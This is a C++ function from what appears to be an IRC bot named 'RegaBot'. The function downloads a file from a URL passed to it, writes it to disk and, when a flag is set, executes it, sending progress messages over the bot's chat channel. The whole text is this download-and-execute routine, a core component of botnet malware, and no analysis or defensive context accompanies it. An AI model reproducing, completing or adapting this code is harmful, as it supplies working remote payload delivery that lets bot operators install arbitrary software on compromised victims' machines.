void CIRC::DownloadFile(char *szUrl, char *szDestLocation, int iExecute, int iRedirect)
{
	HINTERNET hInetOpen, hInetUrl;
	char szTemp[MSG_SIZE]="";
	DWORD dwBytesRead;
	int iFp=0;

	iFp = _open(szDestLocation, _O_BINARY | _O_CREAT | _O_RDWR | _O_TRUNC, _S_IREAD | _S_IWRITE);
	
	hInetOpen = InternetOpen("RegaBot", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if(hInetOpen && iFp != -1)
	{
		hInetUrl = InternetOpenUrl(hInetOpen, szUrl, NULL, NULL, NULL, NULL);
		
		if(hInetUrl)
		{
			SendMessage("Downloading file");
			do
			{
				InternetReadFile(hInetUrl, szTemp, MSG_SIZE, &dwBytesRead);
				_write(iFp, szTemp, dwBytesRead);				
			}
			while(dwBytesRead==MSG_SIZE);
			SendMessage("Download finished");
		}
	}

	_close(iFp);
	InternetCloseHandle(hInetUrl);
	InternetCloseHandle(hInetOpen);

	if(iExecute==1)
	{
		RunApp(szDestLocation, iRedirect);
	}
}